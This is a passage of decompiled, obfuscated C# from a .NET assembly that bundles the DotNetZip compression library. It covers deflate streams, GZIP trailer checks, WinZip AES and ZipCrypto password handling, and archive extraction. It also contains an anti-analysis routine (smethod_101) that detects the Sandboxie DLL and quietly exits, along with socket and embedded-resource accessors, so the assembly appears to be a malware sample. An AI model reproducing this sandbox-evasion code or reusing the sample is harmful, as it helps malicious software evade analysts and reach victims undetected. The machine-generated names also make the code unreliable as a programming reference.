				}
				int num3 = -(num2 >> 4);
				int int_ = num2 & 15;
				if ((num = Class16.smethod_45(class76_0, int_)) >= 0)
				{
					num2 = (int)class78_0.short_0[num3 | num >> 9];
					Class16.smethod_180(class76_0, num2 & 15);
					return num2 >> 4;
				}
				int int_2 = class76_0.int_2;
				num = Class16.smethod_45(class76_0, int_2);
				num2 = (int)class78_0.short_0[num3 | num >> 9];
				if ((num2 & 15) <= int_2)
				{
					Class16.smethod_180(class76_0, num2 & 15);
					return num2 >> 4;
				}
				return -1;
			}
			else
			{
				int int_3 = class76_0.int_2;
				num = Class16.smethod_45(class76_0, int_3);
				int num2 = (int)class78_0.short_0[num];
				if (num2 >= 0 && (num2 & 15) <= int_3)
				{
					Class16.smethod_180(class76_0, num2 & 15);
					return num2 >> 4;
				}
				return -1;
			}
		}

		static int smethod_69(Class39 class39_0, Enum20 enum20_0, Enum21 enum21_0)
		{
			int result = 0;
			if (class39_0.enum20_0 != enum20_0)
			{
				Class39.Class40 @class = Class16.smethod_611(enum20_0);
				if (@class.enum15_0 != class39_0.class40_0.enum15_0 && class39_0.gclass2_0.long_0 != 0L)
				{
					result = Class16.smethod_675(class39_0.gclass2_0, Enum19.const_1);
				}
				class39_0.enum20_0 = enum20_0;
				class39_0.class40_0 = @class;
				Class16.smethod_645(class39_0);
			}
			class39_0.enum21_0 = enum21_0;
			return result;
		}

		static void smethod_70(Class39 class39_0, byte[] byte_0, int int_0, int int_1)
		{
			Array.Copy(byte_0, int_0, class39_0.byte_0, class39_0.int_21, int_1);
			class39_0.int_21 += int_1;
		}

		static string smethod_71(string string_0)
		{
			if (string_0.StartsWith("./"))
			{
				string_0 = string_0.Substring(2);
			}
			string_0 = string_0.Replace("/./", "/");
			string_0 = Class21.regex_0.Replace(string_0, "$1$3");
			return string_0;
		}

		static int smethod_72(Class44 class44_0)
		{
			if (class44_0.class41_0 != null)
			{
				Class16.smethod_628(class44_0.class41_0);
			}
			class44_0.class41_0 = null;
			return 0;
		}

		static void smethod_73(Stream12 stream12_0)
		{
			if (stream12_0.gclass2_0 == null)
			{
				return;
			}
			if (stream12_0.enum24_0 == Stream12.Enum24.const_0)
			{
				bool flag;
				do
				{
					stream12_0.gclass2_0.byte_1 = Class16.smethod_127(stream12_0);
					stream12_0.gclass2_0.int_2 = 0;
					stream12_0.gclass2_0.int_3 = stream12_0.byte_0.Length;
					int num = (stream12_0.enum22_0 == Enum22.const_0) ? Class16.smethod_675(stream12_0.gclass2_0, Enum19.const_4) : Class16.smethod_202(stream12_0.gclass2_0, Enum19.const_4);
					if (num != 1 && num != 0)
					{
						goto IL_125;
					}
					if (stream12_0.byte_0.Length - stream12_0.gclass2_0.int_3 > 0)
					{
						stream12_0.stream_0.Write(stream12_0.byte_0, 0, stream12_0.byte_0.Length - stream12_0.gclass2_0.int_3);
					}
					flag = (stream12_0.gclass2_0.int_1 == 0 && stream12_0.gclass2_0.int_3 != 0);
					if (stream12_0.enum23_0 == Enum23.const_2 && stream12_0.enum22_0 != Enum22.const_0)
					{
						flag = (stream12_0.gclass2_0.int_1 == 8 && stream12_0.gclass2_0.int_3 != 0);
					}
				}
				while (!flag);
				stream12_0.Flush();
				if (stream12_0.enum23_0 != Enum23.const_2)
				{
					return;
				}
				if (stream12_0.enum22_0 == Enum22.const_0)
				{
					int value = (int)(~(int)stream12_0.gclass3_0.uint_2);
					stream12_0.stream_0.Write(BitConverter.GetBytes(value), 0, 4);
					int value2 = (int)(stream12_0.gclass3_0.long_0 & (long)((ulong)-1));
					stream12_0.stream_0.Write(BitConverter.GetBytes(value2), 0, 4);
					return;
				}
				throw new GException0("Writing with decompression is not supported.");
				IL_125:
				string text = ((stream12_0.enum22_0 == Enum22.const_0) ? "de" : "in") + "flating";
				if (stream12_0.gclass2_0.string_0 == null)
				{
					int num;
					throw new GException0(string.Format("{0}: (rc = {1})", text, num));
				}
				throw new GException0(text + ": " + stream12_0.gclass2_0.string_0);
			}
			else if (stream12_0.enum24_0 == Stream12.Enum24.const_1 && stream12_0.enum23_0 == Enum23.const_2)
			{
				if (stream12_0.enum22_0 == Enum22.const_0)
				{
					throw new GException0("Reading with compression is not supported.");
				}
				if (stream12_0.gclass2_0.long_1 == 0L)
				{
					return;
				}
				byte[] array = new byte[8];
				if (stream12_0.gclass2_0.int_1 < 8)
				{
					Array.Copy(stream12_0.gclass2_0.byte_0, stream12_0.gclass2_0.int_0, array, 0, stream12_0.gclass2_0.int_1);
					int num2 = 8 - stream12_0.gclass2_0.int_1;
					int num3 = stream12_0.stream_0.Read(array, stream12_0.gclass2_0.int_1, num2);
					if (num2 != num3)
					{
						throw new GException0(string.Format("Missing or incomplete GZIP trailer. Expected 8 bytes, got {0}.", stream12_0.gclass2_0.int_1 + num3));
					}
				}
				else
				{
					Array.Copy(stream12_0.gclass2_0.byte_0, stream12_0.gclass2_0.int_0, array, 0, array.Length);
				}
				int num4 = BitConverter.ToInt32(array, 0);
				int num5 = (int)(~(int)stream12_0.gclass3_0.uint_2);
				int num6 = BitConverter.ToInt32(array, 4);
				int num7 = (int)(stream12_0.gclass2_0.long_1 & (long)((ulong)-1));
				if (num5 != num4)
				{
					throw new GException0(string.Format("Bad CRC32 in GZIP trailer. (actual({0:X8})!=expected({1:X8}))", num5, num4));
				}
				if (num7 != num6)
				{
					throw new GException0(string.Format("Bad size in GZIP trailer. (actual({0})!=expected({1}))", num7, num6));
				}
			}
		}

		static void smethod_74(GClass1 gclass1_0, IEnumerable<string> ienumerable_0)
		{
			Class16.smethod_665(ienumerable_0, null, gclass1_0);
		}

		static int smethod_75(GClass2 gclass2_0)
		{
			return Class16.smethod_652(gclass2_0, gclass2_0.int_4);
		}

		static byte[] smethod_76(Class58 class58_0)
		{
			return class58_0.byte_0;
		}

		static byte[] smethod_77(byte[] byte_0, int int_0, Class22 class22_0)
		{
			if (byte_0 == null)
			{
				throw new ArgumentNullException("cipherText");
			}
			if (int_0 > byte_0.Length)
			{
				throw new ArgumentOutOfRangeException("length", "Bad length during Decryption: the length parameter must be smaller than or equal to the size of the destination array.");
			}
			byte[] array = new byte[int_0];
			for (int i = 0; i < int_0; i++)
			{
				byte b = byte_0[i] ^ Class16.smethod_336(class22_0);
				Class16.smethod_599(class22_0, b);
				array[i] = b;
			}
			return array;
		}

		static GClass0 smethod_78(GClass1 gclass1_0, string string_0, string string_1, Enum10 enum10_0, bool bool_0, int int_0)
		{
			if (gclass1_0.textWriter_0 != null)
			{
				gclass1_0.textWriter_0.WriteLine("{0} {1}...", (enum10_0 == Enum10.const_0) ? "adding" : "Adding or updating", string_0);
			}
			if (int_0 == 0)
			{
				gclass1_0.bool_10 = false;
				Class16.smethod_228(gclass1_0);
			}
			if (gclass1_0.bool_10)
			{
				return null;
			}
			string text = string_1;
			GClass0 gClass = null;
			if (int_0 > 0)
			{
				int num = string_0.Length;
				for (int i = int_0; i > 0; i--)
				{
					num = string_0.LastIndexOfAny("/\\".ToCharArray(), num - 1, num - 1);
				}
				text = string_0.Substring(num + 1);
				text = Path.Combine(string_1, text);
			}
			if (int_0 > 0 || string_1 != "")
			{
				gClass = Class16.smethod_481(string_0, text);
				gClass.class8_0 = new Class8(gclass1_0);
				gClass.AlternateEncoding = gclass1_0.encoding_0;
				gClass.AlternateEncodingUsage = gclass1_0.enum9_0;
				Class16.smethod_404(gClass);
				gClass.EmitTimesInWindowsFormatWhenSaving = gclass1_0.bool_2;
				gClass.EmitTimesInUnixFormatWhenSaving = gclass1_0.bool_3;
				if (!gclass1_0.dictionary_0.ContainsKey(gClass.string_1))
				{
					Class16.smethod_634(gClass.string_1, gClass, gclass1_0);
					Class16.smethod_522(gClass, gclass1_0);
				}
				text = gClass.string_1;
			}
			if (!gclass1_0.bool_10)
			{
				string[] files = Directory.GetFiles(string_0);
				if (bool_0)
				{
					string[] array = files;
					for (int j = 0; j < array.Length; j++)
					{
						string string_2 = array[j];
						if (gclass1_0.bool_10)
						{
							break;
						}
						if (enum10_0 == Enum10.const_0)
						{
							Class16.smethod_655(gclass1_0, string_2, text);
						}
						else
						{
							Class16.smethod_670(gclass1_0, string_2, text);
						}
					}
					if (!gclass1_0.bool_10)
					{
						string[] directories = Directory.GetDirectories(string_0);
						string[] array2 = directories;
						for (int k = 0; k < array2.Length; k++)
						{
							string text2 = array2[k];
							FileAttributes attributes = File.GetAttributes(text2);
							if (gclass1_0.AddDirectoryWillTraverseReparsePoints || (attributes & FileAttributes.ReparsePoint) == (FileAttributes)0)
							{
								Class16.smethod_78(gclass1_0, text2, string_1, enum10_0, bool_0, int_0 + 1);
							}
						}
					}
				}
			}
			if (int_0 == 0)
			{
				Class16.smethod_209(gclass1_0);
			}
			return gClass;
		}

		static int smethod_79(string string_0, string string_1, GClass1 gclass1_0)
		{
			ICollection<GClass0> collection = Class16.smethod_506(string_1, string_0, gclass1_0);
			Class16.smethod_219(gclass1_0, collection);
			return collection.Count;
		}

		static void smethod_80(GClass0 gclass0_0, string string_0)
		{
			if (gclass0_0.enum2_1 == Enum2.const_0)
			{
				return;
			}
			if (gclass0_0.enum2_1 != Enum2.const_1)
			{
				if (gclass0_0.enum2_1 == Enum2.const_2 || gclass0_0.enum2_1 == Enum2.const_3)
				{
					if (string_0 == null)
					{
						throw new ZipException("Missing password.");
					}
					if (gclass0_0.class20_0 != null)
					{
						Class16.smethod_525(gclass0_0.class20_0, string_0);
						return;
					}
					int num = Class16.smethod_543(gclass0_0.enum2_1);
					gclass0_0.ArchiveStream.Seek(gclass0_0.FileDataPosition - (long)num, SeekOrigin.Begin);
					int int_ = Class16.smethod_176(gclass0_0.enum2_1);
					gclass0_0.class20_0 = Class16.smethod_83(gclass0_0.ArchiveStream, string_0, int_);
				}
				return;
			}
			if (string_0 == null)
			{
				throw new ZipException("Missing password.");
			}
			gclass0_0.ArchiveStream.Seek(gclass0_0.FileDataPosition - 12L, SeekOrigin.Begin);
			gclass0_0.class22_0 = Class16.smethod_21(string_0, gclass0_0);
		}

		static void smethod_81(int int_0, int int_1, Class74.Class76 class76_0, byte[] byte_0)
		{
			if (class76_0.int_0 < class76_0.int_1)
			{
				throw new InvalidOperationException();
			}
			int num = int_1 + int_0;
			if (0 <= int_1 && int_1 <= num && num <= byte_0.Length)
			{
				if ((int_0 & 1) != 0)
				{
					class76_0.uint_0 |= (uint)((uint)(byte_0[int_1++] & 255) << class76_0.int_2);
					class76_0.int_2 += 8;
				}
				class76_0.byte_0 = byte_0;
				class76_0.int_0 = int_1;
				class76_0.int_1 = num;
				return;
			}
			throw new ArgumentOutOfRangeException();
		}

		static bool smethod_82(string string_0)
		{
			return Class16.smethod_545(null, string_0, false);
		}

		static Class20 smethod_83(Stream stream_0, string string_0, int int_0)
		{
			Class20 @class = new Class20(string_0, int_0);
			int num = @class.int_0 / 8 / 2;
			@class.byte_0 = new byte[num];
			@class.byte_1 = new byte[2];
			stream_0.Read(@class.byte_0, 0, @class.byte_0.Length);
			stream_0.Read(@class.byte_1, 0, @class.byte_1.Length);
			@class.short_0 = (short)((int)@class.byte_1[0] + (int)@class.byte_1[1] * 256);
			if (string_0 != null)
			{
				@class.short_1 = (short)((int)Class16.smethod_363(@class)[0] + (int)Class16.smethod_363(@class)[1] * 256);
				if (@class.short_1 != @class.short_0)
				{
					throw new BadPasswordException("bad password");
				}
			}
			return @class;
		}

		static void smethod_84(string string_0, GClass1 gclass1_0)
		{
			gclass1_0.method_1(string_0, true);
		}

		static void smethod_85(GClass1 gclass1_0)
		{
			gclass1_0.bool_5 = true;
		}

		static void smethod_86(GClass0 gclass0_0, string string_0, bool bool_0, GClass1 gclass1_0, int int_0)
		{
			EventHandler<EventArgs4> eventHandler_ = gclass1_0.eventHandler_2;
			if (eventHandler_ != null)
			{
				EventArgs4 eventArgs = new EventArgs4(gclass1_0.ArchiveNameForEvent, bool_0, gclass1_0.dictionary_0.Count, int_0, gclass0_0, string_0);
				eventHandler_(gclass1_0, eventArgs);
				if (eventArgs.bool_0)
				{
					gclass1_0.bool_9 = true;
				}
			}
		}

		static Enum9 smethod_87(Class8 class8_0)
		{
			if (class8_0.gclass1_0 != null)
			{
				return class8_0.gclass1_0.enum9_0;
			}
			if (class8_0.stream0_0 != null)
			{
				return class8_0.stream0_0.enum9_0;
			}
			return Enum9.const_0;
		}

		static void smethod_88(Class20 class20_0)
		{
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(class20_0.string_0, class20_0.byte_0, class20_0.int_1);
			class20_0.byte_5 = rfc2898DeriveBytes.GetBytes(class20_0.int_0 / 8);
			class20_0.byte_3 = rfc2898DeriveBytes.GetBytes(class20_0.int_0 / 8);
			class20_0.byte_2 = rfc2898DeriveBytes.GetBytes(2);
			class20_0.bool_0 = true;
		}

		static int smethod_89(Stream stream_0)
		{
			return Class16.smethod_296("Could not read block - no data!  (position 0x{0:X8})", stream_0);
		}

		static bool smethod_90(GClass0 gclass0_0)
		{
			return gclass0_0.long_2 >= 16L && gclass0_0.short_8 != 0 && gclass0_0.enum20_0 != Enum20.const_0 && gclass0_0.long_0 >= gclass0_0.long_2 && (gclass0_0.enum0_0 != Enum0.const_2 || gclass0_0.stream_1.CanSeek) && (gclass0_0.class20_1 == null || gclass0_0.long_0 - (long)Class16.smethod_318(gclass0_0.class20_1) > gclass0_0.long_2 + 16L) && (gclass0_0.class22_1 == null || gclass0_0.long_0 - 12L > gclass0_0.long_2);
		}

		static string smethod_91(Class60 class60_0)
		{
			return class60_0.string_0;
		}

		static int smethod_92(DateTime dateTime_0)
		{
			dateTime_0 = dateTime_0.ToLocalTime();
			ushort num = (ushort)((dateTime_0.Day & 31) | (dateTime_0.Month << 5 & 480) | (dateTime_0.Year - 1980 << 9 & 65024));
			ushort num2 = (ushort)((dateTime_0.Second / 2 & 31) | (dateTime_0.Minute << 5 & 2016) | (dateTime_0.Hour << 11 & 63488));
			return (int)num << 16 | (int)num2;
		}

		static GClass0 smethod_93(string string_0)
		{
			return Class16.smethod_381(null, string_0, Enum0.const_6, null);
		}

		static void smethod_94(int int_0, Class33 class33_0, int int_1)
		{
			int[][] int_2 = class33_0.class34_0.int_3;
			byte[][] byte_ = class33_0.class34_0.byte_4;
			for (int i = 0; i < int_1; i++)
			{
				int num = 32;
				int num2 = 0;
				byte[] array = byte_[i];
				int num3 = int_0;
				while (--num3 >= 0)
				{
					int num4 = (int)(array[num3] & 255);
					if (num4 > num2)
					{
						num2 = num4;
					}
					if (num4 < num)
					{
						num = num4;
					}
				}
				int[] int_3 = int_2[i];
				byte[] byte_2 = byte_[i];
				Class16.smethod_490(num2, byte_2, int_0, int_3, num);
			}
		}

		static void smethod_95(Stream stream_0, GClass0 gclass0_0)
		{
			if (gclass0_0.enum2_0 == Enum2.const_0)
			{
				return;
			}
			string text = gclass0_0.string_3;
			if (gclass0_0.enum0_0 == Enum0.const_3 && text == null)
			{
				text = Class16.smethod_663(gclass0_0.class8_0);
			}
			if (text == null)
			{
				gclass0_0.class22_1 = null;
				gclass0_0.class20_1 = null;
				return;
			}
			if (gclass0_0.enum2_0 == Enum2.const_1)
			{
				gclass0_0.class22_1 = Class16.smethod_311(text);
				Random random = new Random();
				byte[] array = new byte[12];
				random.NextBytes(array);
				if ((gclass0_0.short_7 & 8) == 8)
				{
					gclass0_0.int_1 = Class16.smethod_92(gclass0_0.LastModified);
					array[11] = (byte)(gclass0_0.int_1 >> 8 & 255);
				}
				else
				{
					Class16.smethod_186(gclass0_0);
					array[11] = (byte)(gclass0_0.int_2 >> 24 & 255);
				}
				byte[] array2 = Class16.smethod_419(gclass0_0.class22_1, array, array.Length);
				stream_0.Write(array2, 0, array2.Length);
				gclass0_0.int_3 += array2.Length;
				return;
			}
			if (gclass0_0.enum2_0 == Enum2.const_2 || gclass0_0.enum2_0 == Enum2.const_3)
			{
				int int_ = Class16.smethod_176(gclass0_0.enum2_0);
				gclass0_0.class20_1 = Class16.smethod_364(text, int_);
				stream_0.Write(gclass0_0.class20_1.byte_0, 0, gclass0_0.class20_1.byte_0.Length);
				stream_0.Write(Class16.smethod_363(gclass0_0.class20_1), 0, Class16.smethod_363(gclass0_0.class20_1).Length);
				gclass0_0.int_3 += gclass0_0.class20_1.byte_0.Length + Class16.smethod_363(gclass0_0.class20_1).Length;
			}
		}

		static GClass0 smethod_96(string string_0, string string_1, Encoding encoding_0, GClass1 gclass1_0)
		{
			MemoryStream memoryStream = new MemoryStream();
			StreamWriter streamWriter = new StreamWriter(memoryStream, encoding_0);
			streamWriter.Write(string_0);
			streamWriter.Flush();
			memoryStream.Seek(0L, SeekOrigin.Begin);
			return Class16.smethod_632(memoryStream, string_1, gclass1_0);
		}

		static EventArgs1 smethod_97(string string_0, int int_0)
		{
			return new EventArgs1(string_0, Enum6.const_4)
			{
				int_0 = int_0
			};
		}

		static Stream13 smethod_98(GClass0 gclass0_0, string string_0)
		{
			Class16.smethod_613(gclass0_0);
			Class16.smethod_216(gclass0_0);
			Class16.smethod_80(gclass0_0, string_0);
			if (gclass0_0.enum0_0 != Enum0.const_3)
			{
				throw new BadStateException("You must call ZipFile.Save before calling OpenReader");
			}
			long long_ = (gclass0_0.short_9 == 0) ? gclass0_0.long_1 : gclass0_0.long_2;
			Stream archiveStream = gclass0_0.ArchiveStream;
			gclass0_0.ArchiveStream.Seek(gclass0_0.FileDataPosition, SeekOrigin.Begin);
			gclass0_0.stream_2 = Class16.smethod_239(archiveStream, gclass0_0);
			Stream stream_ = Class16.smethod_257(gclass0_0, gclass0_0.stream_2);
			return new Stream13(stream_, long_);
		}

		static int smethod_99(GClass2 gclass2_0)
		{
			if (gclass2_0.class44_0 == null)
			{
				throw new GException0("No Inflate State!");
			}
			return Class16.smethod_530(gclass2_0.class44_0);
		}

		static void smethod_100(Enum3 enum3_0, string string_0, GClass0 gclass0_0)
		{
			gclass0_0.ExtractExistingFile = enum3_0;
			Class16.smethod_146(".", string_0, gclass0_0, null);
		}

		static void smethod_101()
		{
			try
			{
				if (Class16.GetModuleHandle("SbieDll.dll").ToInt32() != 0)
				{
					Environment.Exit(0);
				}
			}
			catch
			{
			}
		}

		static void smethod_102(GClass1 gclass1_0, string string_0)
		{
			Class16.smethod_505(".", false, gclass1_0, string_0, null);
		}

		static Enum8 smethod_103(Class8 class8_0)
		{
			if (class8_0.gclass1_0 != null)
			{
				return class8_0.gclass1_0.enum8_0;
			}
			if (class8_0.stream1_0 != null)
			{
				throw new NotSupportedException();
			}
			return class8_0.stream0_0.enum8_0;
		}

		static GClass0 smethod_104(Delegate0 delegate0_0, GClass1 gclass1_0, string string_0)
		{
			GClass0 gclass0_ = Class16.smethod_667(string_0, delegate0_0);
			if (gclass1_0.textWriter_0 != null)
			{
				gclass1_0.textWriter_0.WriteLine("adding {0}...", string_0);
			}
			return Class16.smethod_387(gclass1_0, gclass0_);
		}

		static void smethod_105(GClass0 gclass0_0, Stream stream_0)
		{
			Class16.smethod_146(null, null, gclass0_0, stream_0);
		}

		static void smethod_106(GClass0 gclass0_0, Enum3 enum3_0)
		{
			gclass0_0.ExtractExistingFile = enum3_0;
			Class16.smethod_146(".", null, gclass0_0, null);
		}

		static void smethod_107(GClass0 gclass0_0, string string_0)
		{
			Class16.smethod_146(string_0, null, gclass0_0, null);
		}

		static void smethod_108(GClass0 gclass0_0, int int_0)
		{
			if (int_0 > 1)
			{
				gclass0_0.short_8 = 0;
				return;
			}
			if (gclass0_0.bool_4)
			{
				gclass0_0.short_8 = 0;
				return;
			}
			if (gclass0_0.enum0_0 == Enum0.const_3)
			{
				return;
			}
			if (gclass0_0.enum0_0 == Enum0.const_2)
			{
				if (gclass0_0.stream_1 != null && gclass0_0.stream_1.CanSeek)
				{
					long length = gclass0_0.stream_1.Length;
					if (length == 0L)
					{
						gclass0_0.short_8 = 0;
						return;
					}
				}
			}
			else if (gclass0_0.enum0_0 == Enum0.const_1 && Class16.smethod_552(gclass0_0.string_0) == 0L)
			{
				gclass0_0.short_8 = 0;
				return;
			}
			if (gclass0_0.SetCompression != null)
			{
				gclass0_0.CompressionLevel = gclass0_0.SetCompression(gclass0_0.string_0, gclass0_0.string_1);
			}
			if (gclass0_0.enum20_0 == Enum20.const_0 && gclass0_0.short_8 == 8)
			{
				gclass0_0.short_8 = 0;
			}
		}

		static void smethod_109(Stream1 stream1_0)
		{
			stream1_0.stream13_0 = Class16.smethod_98(stream1_0.gclass0_0, stream1_0.string_0);
			stream1_0.long_0 = stream1_0.stream13_0.Length;
			stream1_0.bool_0 = false;
		}

		static void smethod_110(Class39 class39_0)
		{
			if (class39_0.int_51 == 16)
			{
				class39_0.byte_0[class39_0.int_21++] = (byte)class39_0.short_6;
				class39_0.byte_0[class39_0.int_21++] = (byte)(class39_0.short_6 >> 8);
				class39_0.short_6 = 0;
				class39_0.int_51 = 0;
				return;
			}
			if (class39_0.int_51 >= 8)
			{
				class39_0.byte_0[class39_0.int_21++] = (byte)class39_0.short_6;
				class39_0.short_6 = (short)(class39_0.short_6 >> 8);
				class39_0.int_51 -= 8;
			}
		}

		static string smethod_111(Class60 class60_0)
		{
			return class60_0.string_1;
		}

		static string smethod_112(Encoding encoding_0, byte[] byte_0)
		{
			return encoding_0.GetString(byte_0, 0, byte_0.Length);
		}

		static void smethod_113(Class62 class62_0, string string_0)
		{
			class62_0.string_2 = string_0;
		}

		static string smethod_114()
		{
			return Class16.smethod_469();
		}

		static EventArgs5 smethod_115(GClass0 gclass0_0, Exception exception_0, string string_0)
		{
			return new EventArgs5
			{
				enum6_0 = Enum6.const_23,
				string_0 = string_0,
				gclass0_0 = gclass0_0,
				exception_0 = exception_0
			};
		}

		static string smethod_116()
		{
			return "DotNetZip-" + Path.GetRandomFileName().Substring(0, 8) + ".tmp";
		}

		static bool smethod_117(bool bool_0, GClass0 gclass0_0, string string_0, GClass1 gclass1_0)
		{
			EventHandler<EventArgs4> eventHandler_ = gclass1_0.eventHandler_2;
			if (eventHandler_ != null)
			{
				EventArgs4 eventArgs = bool_0 ? Class16.smethod_512(gclass1_0.ArchiveNameForEvent, gclass0_0, string_0) : Class16.smethod_274(string_0, gclass1_0.ArchiveNameForEvent, gclass0_0);
				eventHandler_(gclass1_0, eventArgs);
				if (eventArgs.bool_0)
				{
					gclass1_0.bool_9 = true;
				}
			}
			return gclass1_0.bool_9;
		}

		static void smethod_118(EventArgs0 eventArgs0_0, long long_0)
		{
			eventArgs0_0.long_0 = long_0;
		}

		static ZipSegmentedStream smethod_119(int int_0, string string_0)
		{
			ZipSegmentedStream zipSegmentedStream = new ZipSegmentedStream();
			zipSegmentedStream.rwMode_0 = ZipSegmentedStream.RwMode.Write;
			Class16.smethod_472(zipSegmentedStream, 0u);
			zipSegmentedStream.string_0 = string_0;
			zipSegmentedStream.int_0 = int_0;
			zipSegmentedStream.string_1 = Path.GetDirectoryName(string_0);
			ZipSegmentedStream zipSegmentedStream2 = zipSegmentedStream;
			if (zipSegmentedStream2.string_1 == "")
			{
				zipSegmentedStream2.string_1 = ".";
			}
			Class16.smethod_8(zipSegmentedStream2, 0u);
			return zipSegmentedStream2;
		}

		static void smethod_120(Stream8 stream8_0)
		{
			stream8_0.queue_0 = new Queue<int>();
			stream8_0.queue_1 = new Queue<int>();
			stream8_0.list_0 = new List<Class37>();
			int num = Stream8.int_0 * Environment.ProcessorCount;
			num = Math.Min(num, stream8_0.int_1);
			for (int i = 0; i < num; i++)
			{
				stream8_0.list_0.Add(new Class37(i, stream8_0.int_6));
				stream8_0.queue_1.Enqueue(i);
			}
			stream8_0.autoResetEvent_0 = new AutoResetEvent(false);
			stream8_0.int_5 = -1;
			stream8_0.int_2 = -1;
			stream8_0.int_3 = -1;
			stream8_0.int_4 = -1;
		}

		static void smethod_121(Class55 class55_0, byte[] byte_0)
		{
			class55_0.byte_0 = byte_0;
		}

		static void smethod_122(Enum3 enum3_0, string string_0, GClass1 gclass1_0)
		{
			gclass1_0.ExtractExistingFile = enum3_0;
			gclass1_0.method_1(string_0, true);
		}

		static void smethod_123(GClass0 gclass0_0, Stream stream_0)
		{
			byte[] array = new byte[gclass0_0.BufferSize];
			Stream4 stream = new Stream4(gclass0_0.ArchiveStream);
			stream.Seek(gclass0_0.long_4, SeekOrigin.Begin);
			if (gclass0_0.long_6 == 0L)
			{
				gclass0_0.long_6 = (long)gclass0_0.int_3 + gclass0_0.long_1 + (long)gclass0_0.int_4;
			}
			Stream4 stream2 = stream_0 as Stream4;
			gclass0_0.long_4 = ((stream2 != null) ? Class16.smethod_145(stream2) : stream_0.Position);
			long num = gclass0_0.long_6;
			while (num > 0L)
			{
				int count = (num > (long)array.Length) ? array.Length : ((int)num);
				int num2 = stream.Read(array, 0, count);
				stream_0.Write(array, 0, num2);
				num -= (long)num2;
				long long_ = stream.long_1;
				long long_2 = gclass0_0.long_6;
				Class16.smethod_242(long_, long_2, gclass0_0);
				if (gclass0_0.bool_12)
				{
					return;
				}
			}
		}

		static Encoding smethod_124(Class8 class8_0)
		{
			if (class8_0.gclass1_0 != null)
			{
				return GClass1.encoding_1;
			}
			if (class8_0.stream0_0 != null)
			{
				return Class16.smethod_162();
			}
			return null;
		}

		static void smethod_125(GClass0 gclass0_0, int int_0)
		{
			if (int_0 != gclass0_0.int_2 && ((gclass0_0.enum2_0 != Enum2.const_2 && gclass0_0.enum2_0 != Enum2.const_3) || gclass0_0.short_5 != 2))
			{
				throw new BadCrcException("CRC error: the file being extracted appears to be corrupted. " + string.Format("Expected 0x{0:X8}, Actual 0x{1:X8}", gclass0_0.int_2, int_0));
			}
			if (gclass0_0.long_2 == 0L)
			{
				return;
			}
			if (gclass0_0.enum2_0 == Enum2.const_2 || gclass0_0.enum2_0 == Enum2.const_3)
			{
				Stream3 stream3_ = gclass0_0.stream_2 as Stream3;
				gclass0_0.class20_0.byte_6 = Class16.smethod_495(stream3_);
				Class20 class20_ = gclass0_0.class20_0;
				Stream archiveStream = gclass0_0.ArchiveStream;
				Class16.smethod_520(archiveStream, class20_);
			}
		}

		static GClass0 smethod_126(Delegate2 delegate2_0, Delegate1 delegate1_0, GClass1 gclass1_0, string string_0)
		{
			GClass0 gclass0_ = Class16.smethod_54(delegate2_0, string_0, delegate1_0);
			DateTime now = DateTime.Now;
			DateTime now2 = DateTime.Now;
			DateTime now3 = DateTime.Now;
			Class16.smethod_144(now, now3, now2, gclass0_);
			if (gclass1_0.textWriter_0 != null)
			{
				gclass1_0.textWriter_0.WriteLine("adding {0}...", string_0);
			}
			return Class16.smethod_387(gclass1_0, gclass0_);
		}

		static byte[] smethod_127(Stream12 stream12_0)
		{
			if (stream12_0.byte_0 == null)
			{
				stream12_0.byte_0 = new byte[stream12_0.int_0];
			}
			return stream12_0.byte_0;
		}

		static bool smethod_128(ref string string_0, Stream stream_0, [Out] string string_1, GClass0 gclass0_0)
		{
			if (string_1 != null)
			{
				string text = gclass0_0.string_1.Replace("\\", "/");
				if (text.IndexOf(':') == 1)
				{
					text = text.Substring(2);
				}
				if (text.StartsWith("/"))
				{
					text = text.Substring(1);
				}
				if (gclass0_0.class8_0.gclass1_0.FlattenFoldersOnExtract)
				{
					string_0 = Path.Combine(string_1, (text.IndexOf('/') != -1) ? Path.GetFileName(text) : text);
				}
				else
				{
					string_0 = Path.Combine(string_1, text);
				}
				string_0 = string_0.Replace("/", "\\");
				if (!gclass0_0.bool_4 && !gclass0_0.string_1.EndsWith("/"))
				{
					return false;
				}
				if (!Directory.Exists(string_0))
				{
					Directory.CreateDirectory(string_0);
					Class16.smethod_590(false, gclass0_0, string_0);
				}
				else if (gclass0_0.ExtractExistingFile == Enum3.const_1)
				{
					Class16.smethod_590(false, gclass0_0, string_0);
				}
				return true;
			}
			else
			{
				if (stream_0 != null)
				{
					string_0 = null;
					return gclass0_0.bool_4 || gclass0_0.string_1.EndsWith("/");
				}
				throw new ArgumentNullException("outstream");
			}
		}

		static int smethod_129(GClass0 gclass0_0, byte[] byte_0, int int_0, short short_0, long long_0)
		{
			if (gclass0_0.short_8 == 99)
			{
				if ((gclass0_0.short_7 & 1) != 1)
				{
					throw new BadReadException(string.Format("  Inconsistent metadata at position 0x{0:X16}", long_0));
				}
				gclass0_0.bool_8 = true;
				if (short_0 != 7)
				{
					throw new BadReadException(string.Format("  Inconsistent size (0x{0:X4}) in WinZip AES field at position 0x{1:X16}", short_0, long_0));
				}
				gclass0_0.short_5 = BitConverter.ToInt16(byte_0, int_0);
				int_0 += 2;
				if (gclass0_0.short_5 != 1 && gclass0_0.short_5 != 2)
				{
					throw new BadReadException(string.Format("  Unexpected vendor version number (0x{0:X4}) for WinZip AES metadata at position 0x{1:X16}", gclass0_0.short_5, long_0));
				}
				short num = BitConverter.ToInt16(byte_0, int_0);
				int_0 += 2;
				if (num != 17729)
				{
					throw new BadReadException(string.Format("  Unexpected vendor ID (0x{0:X4}) for WinZip AES metadata at position 0x{1:X16}", num, long_0));
				}
				int num2 = (byte_0[int_0] == 1) ? 128 : ((byte_0[int_0] == 3) ? 256 : -1);
				if (num2 < 0)
				{
					throw new BadReadException(string.Format("Invalid key strength ({0})", num2));
				}
				gclass0_0.enum2_1 = (gclass0_0.enum2_0 = ((num2 == 128) ? Enum2.const_2 : Enum2.const_3));
				int_0++;
				gclass0_0.short_9 = (gclass0_0.short_8 = BitConverter.ToInt16(byte_0, int_0));
				int_0 += 2;
			}
			return int_0;
		}

		static Socket smethod_130(Class55 class55_0)
		{
			return class55_0.socket_0;
		}

		static byte[] smethod_131(Class61 class61_0)
		{
			return class61_0.byte_0;
		}

		static void smethod_132(string string_0, Assembly assembly_0, string string_1)
		{
			byte[] array = new byte[1024];
			using (Stream manifestResourceStream = assembly_0.GetManifestResourceStream(string_1))
			{
				if (manifestResourceStream == null)
				{
